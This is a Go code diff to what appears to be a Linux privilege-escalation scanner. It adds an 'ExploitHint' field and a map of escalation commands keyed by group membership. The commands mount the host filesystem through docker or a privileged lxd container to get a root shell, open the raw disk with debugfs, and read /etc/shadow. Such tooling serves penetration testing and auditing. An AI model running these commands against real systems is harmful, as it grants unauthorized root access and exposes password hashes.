@@ -8,6 +8,7 @@ type GroupResult struct {
 	GroupName   string
 	IsDangerous bool
 	Reason      string
+	ExploitHint string
 }
 
 // PrivilegedGroups lists groups that often lead to privilege escalation usefull docker privescalation and lateral movement
@@ -22,6 +23,13 @@ var PrivilegedGroups = map[string]string{
 	"sudo":   "Can execute commands as root (check sudo -l).",
 	"wheel":  "Can execute commands as root (check sudo -l).",
 	"root":   "Is the root group.",
+}
+
+var GroupExploits = map[string]string{
+	"docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt",
+	"lxd":    "lxc image import alpine.tar.gz --alias alpine; lxc init alpine privesc -c security.privileged=true; lxc config device add privesc hostroot disk source=/ path=/mnt/root; lxc start privesc; lxc exec privesc /bin/sh",
+	"disk":   "debugfs /dev/sda1 (or relevant device) - find sensitive files or write to disk.",
+	"shadow": "cat /etc/shadow | grep root",
 }
 
 // ScanGroups checks if the current user belongs to any high-risk groups 
@@ -48,15 +56,20 @@ func ScanGroups() ([]GroupResult, error) {
 		isDangerous := false
 		reason := ""
 
+		exploitHint := ""
 		if desc, exists := PrivilegedGroups[group.Name]; exists {
 			isDangerous = true
 			reason = desc
+			if hint, ok := GroupExploits[group.Name]; ok {
+				exploitHint = hint
+			}
 		}
 
 		results = append(results, GroupResult{
 			GroupName:   group.Name,
 			IsDangerous: isDangerous,
 			Reason:      reason,
+			ExploitHint: exploitHint,
 		})
 	}
 
